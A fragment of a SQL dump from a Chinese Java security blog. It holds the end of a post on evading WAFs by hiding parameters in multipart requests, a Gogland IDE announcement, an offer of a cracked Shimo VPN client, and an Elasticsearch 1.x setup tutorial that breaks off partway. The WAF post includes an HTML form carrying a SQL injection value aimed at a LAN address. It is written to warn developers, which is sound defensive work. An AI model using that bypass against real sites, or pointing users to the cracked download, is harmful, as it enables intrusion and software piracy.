size-full wp-image-1843\" src=\"http://javaweb.org/wp-content/uploads/2015/11/1.jpg\" alt=\"1\" width=\"895\" height=\"590\" /></a></p>\n<p>大概长成上面这样.HTML代码就更加简单了:</p>\n<pre class=\"brush: java; gutter: true\">&lt;!DOCTYPE html&gt; \n&lt;html&gt; \n&lt;head&gt; \n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt; \n&lt;title&gt;yzmm - p2j.cn&lt;/title&gt; \n&lt;/head&gt; \n&lt;body&gt; \n  &lt;form action=&quot;http://192.168.199.151/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; \n       File:&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;br/&gt; \n        ID:&lt;input type=&quot;text&quot; name=&quot;id&quot; value=&quot;select 1 from mysql.user--&quot; style=&quot;width:250px;&quot; / &gt;&lt;br/&gt; \n        &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt; \n    &lt;/form&gt; \n&lt;/body&gt; \n&lt;/html&gt;</pre>\n<p>这个特性其实并不只是PHP的专利,许多其他语言的MVC框架为了简化操作也有可能会做类似PHP FILES解析。虽说原生的JSP/Servlet是不支持解析multipart的.但在Java语言中当今最火的SpringMVC、Struts2都做了一样的事情。你可能经常会看到如下的Spring MVC代码:</p>\n<pre class=\"brush: java; gutter: true\">import javax.servlet.http.HttpServletRequest; \nimport javax.servlet.http.HttpServletResponse; \nimport org.springframework.stereotype.Controller; \nimport org.springframework.web.bind.annotation.RequestMapping; \nimport org.springframework.web.bind.annotation.RequestParam; \nimport org.springframework.web.multipart.MultipartFile; \n@Controller \npublic class TestController { \n  @RequestMapping(&quot;/test1.aspx&quot;) \n  public void test1(HttpServletRequest request,HttpServletResponse response){ \n    System.out.println(&quot;test1.aspx:&quot;+request.getParameter(&quot;username&quot;)); \n  } \n  @RequestMapping(&quot;/test2.aspx&quot;) \n  public void test2(@RequestParam(value = &quot;file&quot;, required = false) MultipartFile file,HttpServletRequest request,HttpServletResponse response){ \n    System.out.println(&quot;test2.aspx:&quot;+request.getParameter(&quot;username&quot;)); \n    System.out.println(&quot;文件名:&quot;+file.getOriginalFilename()); \n  } \n}\n</pre>\n<p>然后是HttpClient客户端测试代码,用于发送HTTP Multipart测试请求:</p>\n<pre class=\"brush: java; gutter: true\">import java.io.File; \nimport java.io.IOException; \nimport org.apache.commons.io.IOUtils; \nimport org.apache.http.HttpEntity; \nimport org.apache.http.client.methods.CloseableHttpResponse; \nimport org.apache.http.client.methods.HttpPost; \nimport org.apache.http.entity.ContentType; \nimport org.apache.http.entity.mime.MultipartEntityBuilder; \nimport org.apache.http.impl.client.CloseableHttpClient; \nimport org.apache.http.impl.client.HttpClients; \npublic class MultipartTest { \n  public static void main(String[] args) { \n    CloseableHttpClient httpClient = HttpClients.createDefault(); \n    HttpPost uploadFile = new HttpPost(&quot;http://localhost:8080/test/test1.aspx&quot;); \n    MultipartEntityBuilder builder = MultipartEntityBuilder.create(); \n    builder.addTextBody(&quot;username&quot;, &quot;admin&quot;, ContentType.TEXT_PLAIN); \n    builder.addTextBody(&quot;password&quot;, &quot;123456&quot;, ContentType.TEXT_PLAIN); \n    builder.addBinaryBody(&quot;file&quot;, new File(&quot;/Users/yz/Downloads/bd_logo1_31bdc765.png&quot;), ContentType.APPLICATION_OCTET_STREAM, &quot;pic&quot;); \n    HttpEntity multipart = builder.build(); \n    uploadFile.setEntity(multipart); \n    try { \n      CloseableHttpResponse response = httpClient.execute(uploadFile); \n      HttpEntity responseEntity = response.getEntity(); \n      System.err.println(IOUtils.toString(responseEntity.getContent())); \n    } catch (IOException e) { \n      e.printStackTrace(); \n    } \n  } \n}\n</pre>\n<p>pom 依赖的jar:</p>\n<pre class=\"brush: java; gutter: true\">&lt;dependency&gt; \n      &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; \n      &lt;artifactId&gt;httpcore&lt;/artifactId&gt; \n      &lt;version&gt;4.4.4&lt;/version&gt; \n    &lt;/dependency&gt; \n    &lt;dependency&gt; \n      &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; \n      &lt;artifactId&gt;httpclient&lt;/artifactId&gt; \n      &lt;version&gt;4.5.1&lt;/version&gt; \n    &lt;/dependency&gt; \n    &lt;dependency&gt; \n      &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; \n      &lt;artifactId&gt;httpasyncclient&lt;/artifactId&gt; \n      &lt;version&gt;4.1.1&lt;/version&gt; \n    &lt;/dependency&gt; \n    &lt;dependency&gt; \n      &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; \n      &lt;artifactId&gt;httpmime&lt;/artifactId&gt; \n      &lt;version&gt;4.5.1&lt;/version&gt; \n    &lt;/dependency&gt; \n    &lt;dependency&gt; \n      &lt;groupId&gt;commons-io&lt;/groupId&gt; \n      &lt;artifactId&gt;commons-io&lt;/artifactId&gt; \n      &lt;version&gt;2.4&lt;/version&gt; \n    &lt;/dependency&gt;\n</pre>\n<p>test1.do是一个最普通的Http请求Mapping,如果当前请求类型是一个multipart请求Spring MVC会将解析好的multipart放到request里面(其实是Spring MVC包装了一个HTTP请求,类名是:org.springframework.web.multipart.support.DefaultMultipartHttpServletRequest)。于是我们在控制层就拿到了multipart里的username参数。</p>\n<p>毫无疑问,使用MultipartTest的测试代码去请求test1.aspx会输出multipart内的username的值:admin.</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/11/2.jpg\"><img class=\"alignnone size-full wp-image-1844\" src=\"http://javaweb.org/wp-content/uploads/2015/11/2.jpg\" alt=\"2\" width=\"1075\" height=\"543\" /></a></p>\n<p>Struts2实现方式和SpringMVC大同小异，同样的也自动的利用commons-fileupload做了HTTP解析。</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2015/11/3.jpg\"><img class=\"alignnone size-full wp-image-1845\" src=\"http://javaweb.org/wp-content/uploads/2015/11/3.jpg\" alt=\"3\" width=\"1062\" height=\"589\" /></a></p>\n<pre class=\"brush: java; gutter: true\">import javax.servlet.http.HttpServletRequest; \nimport org.apache.struts2.ServletActionContext; \nimport com.opensymphony.xwork2.ActionSupport; \npublic class Test extends ActionSupport { \n  private static final long serialVersionUID = 1L; \n  @Override \n  public String execute() throws Exception { \n    HttpServletRequest request = ServletActionContext.getRequest(); \n    System.out.println(request.getParameter(&quot;username&quot;)); \n    return &quot;input&quot;; \n  } \n}\n</pre>\n<p>那么为什么一个看似很简单的表单数据请求解析的功能会让很多的WAF蒙了呢？究其原因主要还是因为HTTP请求解析的复杂性和来自客户端的数据不确定性。因为上传一个几十M甚至更大的文件需求再平常不过了，如果WAF完整的去解析这个InputStream会消耗大量的服务器性能有点得不偿失。</p>\n<p>另一个原因是由于实现HTTP请求的RFC的差异性导致次类请求解析得不一致或者解析错误的情况。因为multipart解析出问题的还不少。去年PHP和Apache Commons FileUpload 就出过DOS漏洞。</p>\n<p><a href=\"http://javaweb.org/?p=670\" target=\"_blank\">Apache Commons FileUpload 和 Apache Tomcat 拒绝服务</a></p>\n<p><a href=\"http://javaweb.org/?p=670\" target=\"_blank\">Multipart  boundary  边界检查问题（分割线长度大于4091的）导致拒绝服务（死循环）</a></p>\n<p><a href=\"http://www.chinaz.com/news/2015/0520/407861.shtml\" target=\"_blank\">PHP曝DOS漏洞可致CPU灌满 涉及多个PHP版本</a></p>\n<p>那么问题来了,各位同学的SQL注入和Struts2的命令执行漏洞真的修好了吗？看看loopx9牛的这个漏洞就知道了 <a href=\"http://www.wooyun.org/bugs/wooyun-2015-0147301\" target=\"_blank\">WooYun: 百度某站st2命令执行(独特执行姿势)</a></p>\n<p>赶紧回家修补丁吧。</p>', null, '2015-11-30 10:04:26', '1', '1100', null, '0', '2015-11-30 10:08:05'), ('1850', '1', '10', 'Gogland 发布 - JetBrains Go IDE', '园长', '<p>\r\n	三年前JetBrains公司决定开发<a href=\"https://github.com/go-lang-plugin-org/go-lang-idea-plugin/\" target=\"_blank\">Golang插件</a>，如今JetBrains 终于发布了一款全新的Go IDE-Gogland。\r\n</p>\r\n<p>\r\n	官方网站:<a href=\"https://www.jetbrains.com/go/\" target=\"_blank\">https://www.jetbrains.com/go/</a> ,目前需要提交申请才能获取下载地址。\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20161225/20161225200258_624.png\" alt=\"\" width=\"640\" height=\"400\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20161225/20161225200307_880.png\" alt=\"\" width=\"630\" height=\"340\" title=\"\" align=\"\" />\r\n</p>', null, '2016-12-25 10:37:24', '1', '752', '', '0', '2016-12-25 10:37:24'), ('1851', '1', '10', 'Shimo-4.1.4.2 破解版 (支持Mac OS sierra PPTP 客户端)', '园长', '<p>\r\n	Mac OS sierra 更新后不再PPTP支持了，从国内的mac分享破解软件里面找的Shimo都不兼容。从google翻到了个Shimo-4.1.4.2破解版，测试可用。\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20161226/20161226093536_239.png\" alt=\"\" width=\"600\" height=\"470\" title=\"\" align=\"\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	下载地址：<a href=\"/uploads/file/20170530/20170530173230_826.dmg\" target=\"_blank\">Shimo-4.1.4.2.dmg</a> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>', null, '2016-12-26 09:36:36', '1', '945', '', '3', '2016-12-26 09:36:36'), ('1852', '1', '32', 'Elasticsearch 1.X ', '园长', '<p>\r\n	<br />\r\n</p>\r\n<pre class=\"brush: java; gutter: true\">这个文档大约2014年在写的，只是修改了下版本号，这个文档写的非常简单，后面有空再发。\r\nelasticsearch和solr都非常适合拿来做分布式全文索引，可以轻松的处理海量数据。\r\n最近一年也没咋发文章,攒了很多都被弄丢掉了...</pre>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	elasticsearch<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。使用</span>elasticsearch<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">可以快速的构建一个全文检索集群帮助你实时搜索。</span> \r\n</p>\r\n<h2 id=\"toc_1\" style=\"font-size:24px;font-family:Helvetica, arial, sans-serif;background-color:#FFFFFF;\">\r\n	一、下载安装\r\n</h2>\r\n<pre class=\"brush: bash; gutter: true\">wget https://download.elasticsearch.org/elasticsearch/elasticsearch/elasticsearch-1.7.3.zip\r\nunzip elasticsearch-1.7.3.zip\r\ncp elasticsearch-1.7.3 elasticsearch-1.7.3-2</pre>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	<strong>单机配置:</strong> \r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	启动:\r\n</p>\r\n<pre class=\"brush: bash; gutter: true\">./bin/elasticsearch（windows下双击elasticsearch.bat）</pre>\r\n<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">后台方式启动:</span> \r\n<pre class=\"brush: bash; gutter: true\">./bin/elasticsearch -d</pre>\r\n<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">启动成功后会监听:</span>9200<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">(web api端)、</span>9300<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">(socket api)、</span>54328<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">(</span><a href=\"www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-discovery-zen.html\">zen discovery</a><span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\"> udp广播)</span> \r\n<h2 id=\"toc_2\" style=\"font-size:24px;font-family:Helvetica, arial, sans-serif;background-color:#FFFFFF;\">\r\n	二：中文分词\r\n</h2>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	在默认情况下elasticsearch是不支持中文分词的，所以需要自行安装分词器以便于检索中文字符。这里采用elasticsearch-analysis-ik+mmseg用于中文分词索引。\r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	<strong>1、下载并安装maven</strong> \r\n</p>\r\n<pre class=\"brush: bash; gutter: true\">wget http://apache.communilink.net/maven/maven-3/3.2.5/binaries/apache-maven-3.2.5-bin.zip</pre>\r\n<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">配置环境变量:</span> \r\n<pre class=\"brush: bash; gutter: true\">vim ~/.bash_profile</pre>\r\n<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">末尾添加:</span> \r\n<pre class=\"brush: bash; gutter: true\">export M2_HOME=/data/apache-maven-3.2.5\r\nPATH=$PATH:$JAVA_HOME/bin:$M2_HOME/bin</pre>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	<strong>2、下载ik和mmseg插件</strong> \r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	解压elasticsearch-analysis-ik-master.zip\r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	编辑elasticsearch-analysis-ik-master/pom.xml中的elasticsearch版本号为1.42(安装的es版本)&nbsp;<elasticsearch.version style=\"-webkit-print-color-adjust: exact;\">1.4.2</elasticsearch.version>\r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	<strong>3、安装elasticsearch-analysis-ik</strong> \r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	构建elasticsearch-analysis-ik jar\r\n</p>\r\n<pre class=\"brush: bash; gutter: true\">cd elasticsearch-analysis-ik-master\r\nmvn clean package</pre>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	构建完成后复制target目录下生成的elasticsearch-analysis-ik-1.2.9.jar到elasticsearch安装目录的lib文件夹。复制elasticsearch-analysis-ik-master/config/ik文件夹到elasticsearch安装目录的config文件夹。\r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	配置elasticsearch-1.4.2/config/elasticsearch.yml\r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	添加以下配置：\r\n</p>\r\n<pre class=\"brush: java; gutter: true\">index:\r\n  analysis:                   \r\n    analyzer:      \r\n      ik:\r\n          alias: [ik_analyzer]\r\n          type: org.elasticsearch.index.analysis.IkAnalyzerProvider\r\n      ik_max_word:\r\n          type: ik\r\n          use_smart: false\r\n      ik_smart:\r\n          type: ik\r\n          use_smart: true</pre>\r\n<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">或者：</span> \r\n<pre class=\"brush: xml; gutter: true\">index.analysis.analyzer.ik.type : \"ik\"</pre>\r\n<strong>4、安装HttpClient</strong> \r\n<pre class=\"brush: bash; gutter: true\">wget http://apache.01link.hk//httpcomponents/httpclient/binary/httpcomponents-client-4.3.6-bin.zip</pre>\r\n<p>\r\n	<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">解压后复制</span>httpcomponents-client-4.3.6<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\"> /lib下的</span>fluent-hc-4.3.6.jar、httpclient-4.3.6.jar、httpclient-cache-4.3.6.jar、httpcore-4.3.3.jar、httpmime-4.3.6.jar<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">到elasticsearch安装目录的lib文件夹。</span> \r\n</p>\r\n<p>\r\n	<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\"><br />\r\n</span> \r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	<strong>5、安装elasticsearch-analysis-mmseg</strong> \r\n</p>\r\n<ol style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	<li>\r\n		解压elasticsearch-analysis-mmseg-master\r\n	</li>\r\n	<li>\r\n		mvn构建elasticsearch-analysis-mmseg\r\n	</li>\r\n	<li>\r\n		在elasticsearch安装目录创建plugins目录，然后在plugins下创建analysis-mmseg。\r\n	</li>\r\n	<li>\r\n		复制构建后的elasticsearch-analysis-mmseg-1.2.2.jar文件到analysis-mmseg目录。\r\n	</li>\r\n	<li>\r\n		复制elasticsearch-analysis-mmseg-master/config/下的mmseg文件夹到elasticsearch安装目录的config文件夹。\r\n	</li>\r\n</ol>\r\n<h2 id=\"toc_3\" style=\"font-size:24px;font-family:Helvetica, arial, sans-serif;background-color:#FFFFFF;\">\r\n	三：Nginx HttpBasic认证\r\n</h2>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	<strong>Elasticsearch</strong>启动后默认监听9200(netty-web端口)、9300(socket transport)。9200端口提供了RESTFUL查询支持比较方便。这里配置nginx代理为es的web接口添加负载和基础认证。\r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	<strong>1、安装nginx</strong> \r\n</p>\r\n<pre class=\"brush: bash; gutter: true\">yum -y install nginx \r\nservice nginx start\r\nchkconfig nginx on</pre>\r\n<strong>2、访问配置</strong> \r\n<pre class=\"brush: bash; gutter: true\">vim /etc/nginx/conf.d/es.conf</pre>\r\n<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">添加:</span> \r\n<pre class=\"brush: java; gutter: true\">server {\r\n    server_name es.xxx.com;\r\n    access_log  logs/es.access.log  main;\r\n    listen 80;\r\n    location / {\r\n        proxy_pass http://localhost:9200;\r\n        auth_basic \"secret\";\r\n        auth_basic_user_file /etc/nginx/conf.d/es.db;\r\n    }\r\n\r\n    location /status {\r\n        stub_status on;\r\n        auth_basic \"NginxStatus\";\r\n    }\r\n}</pre>\r\n<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">下载htpasswd脚本，根据提示生成db文件:</span> \r\n<pre class=\"brush: bash; gutter: true\">wget http://p2j.cn/tools/htpasswd.sh</pre>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	如此配置只能保证9200端口安全，但是9300依旧可能存在问题。加上iptables或者安装es插件。如果确认只对内网开放可以配置(network.bind_host为内网IP)。\r\n</p>\r\n<h2 id=\"toc_4\" style=\"font-size:24px;font-family:Helvetica, arial, sans-serif;background-color:#FFFFFF;\">\r\n	四：集群\r\n</h2>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	<strong>Elasticsearch</strong>会根据集群名称自动加入新的集群，所以只要保证集群名一样就行了。\r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	<strong>1、集群配置</strong> \r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	核心配置文件:&nbsp;config/elasticsearch.yml\r\n</p>\r\n<pre class=\"brush: xml; gutter: true\">node.name: \"es-01\"\r\ncluster.name: \"es-doc\"\r\nnode.master: true 是否设置为主节点，设置es-01为主节点。不设置也会自动选举。</pre>\r\n<img src=\"http://javaweb.org/wp-content/uploads/2015/09/7.png\" alt=\"\" /> \r\n<p>\r\n	<br />\r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	复制已配置好的elasticsearch-1.4.2目录为elasticsearch-1.4.2-2(或者复制已配置好的elasticsearch-1.4.2目录到内网其他服务器)\r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	修改:&nbsp;elasticsearch-1.4.2-2/config/elasticsearch.yml\r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	修改节点配置：\r\n</p>\r\n<pre class=\"brush: xml; gutter: true\">node.name: \"es-02\"\r\ncluster.name: \"es-doc\"\r\n注释掉：#node.master: true</pre>\r\n<h2 id=\"toc_5\" style=\"font-size:24px;font-family:Helvetica, arial, sans-serif;background-color:#FFFFFF;\">\r\n	五：测试\r\n</h2>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	启动两个elasticsearch，因为配置了基础认证所以访问的时候带上密码。\r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	<strong>1、查看集群状态</strong> \r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	http://账号:密码@localhost:6200/_cluster/health?pretty\r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	可以看到：\r\n</p>\r\n<pre class=\"brush: xml; gutter: true\">\"number_of_nodes\" : 2,\r\n\"number_of_data_nodes\" : 2,</pre>\r\n<strong>2、创建索引</strong> \r\n<pre class=\"brush: bash; gutter: true\">curl -XPUT http://localhost:9200/index</pre>\r\n<strong>3、创建映射</strong> \r\n<pre class=\"brush: xml; gutter: true\">curl -XPOST http://localhost:9200/index/fulltext/_mapping -d\'\r\n{\r\n    \"fulltext\": {\r\n             \"_all\": {\r\n            \"indexAnalyzer\": \"ik\",\r\n            \"searchAnalyzer\": \"ik\",\r\n            \"term_vector\": \"no\",\r\n            \"store\": \"false\"\r\n        },\r\n        \"properties\": {\r\n            \"content\": {\r\n                \"type\": \"string\",\r\n                \"store\": \"no\",\r\n                \"term_vector\": \"with_positions_offsets\",\r\n                \"indexAnalyzer\": \"ik\",\r\n                \"searchAnalyzer\": \"ik\",\r\n                \"include_in_all\": \"true\",\r\n                \"boost\": 8\r\n            }\r\n        }\r\n    }\r\n}\'</pre>\r\n<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">4、添加索引</span> \r\n<pre class=\"brush: bash; gutter: true\">curl -XPOST http://localhost:9200/index/fulltext/1 -d\'\r\n{\"content\":\"美国留给伊拉克的是个烂摊子吗\"}\'</pre>\r\n<pre class=\"brush: bash; gutter: true\">curl -XPOST http://localhost:9200/index/fulltext/2 -d\'\r\n{\"content\":\"公安部：各地校车将享最高路权\"}\'</pre>\r\n<pre class=\"brush: bash; gutter: true\">curl -XPOST http://localhost:9200/index/fulltext/3 -d\'\r\n{\"content\":\"中韩渔警冲突调查：韩警平均每天扣1艘中国渔船\"}\'</pre>\r\n<pre class=\"brush: bash; gutter: true\">curl -XPOST http:// localhost:9200/index/fulltext/4 -d\'\r\n{\"content\":\"中国驻洛杉矶领事馆遭亚裔男子枪击 嫌犯已自首\"}</pre>\r\n<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">5、搜索和搜索结果高亮</span> \r\n<pre class=\"brush: bash; gutter: true\">curl -XPOST http://localhost:9200/index/fulltext/_search  -d\'\r\n{\r\n    \"query\" : { \"term\" : { \"content\" : \"中国\" }},\r\n    \"highlight\" : {\r\n        \"pre_tags\" : [\"\", \"\"],\r\n        \"post_tags\" : [\"\", \"\"],\r\n        \"fields\" : {\r\n            \"content\" : {}\r\n        }\r\n    }\r\n}\r\n\'</pre>\r\n<h2 id=\"toc_6\" style=\"font-size:24px;font-family:Helvetica, arial, sans-serif;background-color:#FFFFFF;\">\r\n	六：Java客户端\r\n</h2>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	<strong>1、批量导入</strong> 添加elasticsearch-1.4.2.jar和lucene-core-4.10.2.jar\r\n</p>\r\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\r\n	<strong>测试HtmlDoc.java：</strong> \r\n</p>\r\n<pre class=\"brush: java; gutter: true\">import java.io.File;\r\nimport java.io.FileInputStream;\r\nimport java.io.UnsupportedEncodingException;\r\nimport java.util.HashSet;\r\nimport java.util.LinkedHashMap;\r\nimport java.util.Map;\r\nimport java.util.Set;\r\nimport net.sf.json.JSONObject;\r\nimport org.apache.commons.io.IOUtils;\r\nimport org.elasticsearch.action.bulk.BulkRequestBuilder;\r\nimport org.elasticsearch.action.bulk.BulkResponse;\r\nimport org.elasticsearch.client.Client;\r\nimport org.elasticsearch.client.transport.TransportClient;\r\nimport org.elasticsearch.common.settings.ImmutableSettings;\r\nimport org.elasticsearch.common.settings.Settings;\r\nimport org.elasticsearch.common.transport.InetSocketTransportAddress;\r\nimport org.javaweb.utils.HttpRequestUtils;\r\n\r\n\r\npublic class HtmlDoc {\r\n  \r\n  public static void addIndex(Set&lt;map&lt;string,string&gt;&gt; ls){\r\n    try {\r\n      Settings settings = ImmutableSettings.settingsBuilder().put(\"cluster.name\", \"es-doc\").put(\"client.transport.sniff\", true).build();\r\n      Client client = new TransportClient(settings).addTransportAddress(new InetSocketTransportAddress(\"localhost\",9300));\r\n      BulkRequestBuilder bulkRequest = client.prepareBulk();\r\n      \r\n      for(Map&lt;string,string&gt; doc:ls){\r\n        bulkRequest.add(client.prepareIndex(\"domain\", \"documents\").setSource(JSONObject.fromObject(doc).toString()));\r\n      }\r\n      \r\n      BulkResponse bulkResponse = bulkRequest.execute().actionGet();\r\n      if (bulkResponse.hasFailures()) {\r\n        System.out.println(\"导入失败...\");\r\n      }else{\r\n        System.out.println(\"导入成功...\");\r\n      }\r\n      client.close();\r\n    } catch (Exception e) {\r\n      System.out.println(e.toString()+\",导入异常.\");\r\n    }\r\n  }\r\n}</string,string></map<string,string></pre>\r\n<strong>2、映射</strong> \r\n<pre class=\"brush: bash; gutter: true\">curl -XPUT \'http://localhost:9200/web\'</pre>\r\n<pre class=\"brush: bash; gutter: true\">curl -XPOST \'http://localhost:9200/web/_close\'</pre>\r\n<pre class=\"brush: bash; gutter: true\">curl -XPUT http://localhost:9200/web/_settings -d\'\r\n{\r\n    \"analysis\": {\r\n        \"analyzer\": {\r\n            \"uniqueTokenfilter\": {\r\n                \"type\": \"custom\",\r\n                \"tokenizer\": \"keyword\",\r\n                \"filter\": \"unique\"\r\n            }\r\n        }\r\n    }\r\n}\r\n\'</pre>\r\n<pre class=\"brush: bash; gutter: true\">curl -XPOST \'http://localhost:9200/web/_open\'</pre>\r\n<pre class=\"brush: bash; gutter: true\">curl -XPOST http://localhost:6200/web/documents/_mapping -d\'\r\n{\r\n    \"documents\": {\r\n        \"dynamic\": true, \r\n        \"_all\": {\r\n            \"enabled\": false\r\n        }, \r\n        \"_source\": {\r\n            \"enabled\": true\r\n        }, \r\n        \"properties\": {\r\n            \"domain\": {\r\n                \"type\": \"string\", \r\n                \"index\": \"not_analyzed\"\r\n            }, \r\n            \"location\": {\r\n                \"type\": \"nested\", \r\n                \"include_in_parent\": true, \r\n                \"properties\": {\r\n                    \"ip\": {\r\n                        \"type\": \"string\", \r\n                        \"index\": \"not_analyzed\"\r\n                    }, \r\n                    \"country_code\": {\r\n                        \"type\": \"string\", \r\n                        \"index\": \"not_analyzed\"\r\n                    }, \r\n                    \"country_name\": {\r\n                        \"type\": \"string\", \r\n                        \"index\": \"not_analyzed\"\r\n                    }, \r\n                    \"region_name\": {\r\n                        \"type\": \"string\", \r\n                        \"index\": \"not_analyzed\"\r\n                    }, \r\n                    \"city\": {\r\n                        \"type\": \"string\", \r\n                        \"index\": \"not_analyzed\"\r\n                    }, \r\n                    \"latitude\": {\r\n                        \"type\": \"double\"\r\n                    }, \r\n                    \"longitude\": {\r\n                        \"type\": \"double\"\r\n                    }\r\n                }\r\n            }, \r\n            \"port\": {\r\n                \"type\": \"integer\"\r\n            }, \r\n            \"header\": {\r\n                \"type\": \"string\", \r\n                \"index\": \"analyzed\"\r\n            }, \r\n            \"header_info\": {\r\n                \"type\": \"nested\", \r\n                \"include_in_parent\": true, \r\n                \"properties\": {\r\n                    \"response_code\": {\r\n                        \"type\": \"integer\"\r\n                    }, \r\n                    \"response_content_type\": {\r\n                        \"type\": \"string\", \r\n                        \"index\": \"analyzed\"\r\n                    }, \r\n                    \"response_message\": {\r\n                        \"type\": \"string\", \r\n                        \"index\": \"analyzed\"\r\n                    }, \r\n                    \"server\": {\r\n                        \"type\": \"string\", \r\n                        \"store\": \"yes\", \r\n                        \"index\": \"analyzed\"\r\n                    }, \r\n                    \"x_powered_by\": {\r\n                        \"type\": \"string\", \r\n                        \"store\": \"yes\", \r\n                        \"index\": \"analyzed\"\r\n                    }\r\n                }\r\n            }, \r\n            \"title\": {\r\n                \"type\": \"string\", \r\n                \"index\": \"analyzed\",\r\n                \"boost\": 8\r\n            }, \r\n            \"body\": {\r\n                \"type\": \"string\", \r\n                \"index\": \"analyzed\"\r\n            }, \r\n            \"url\": 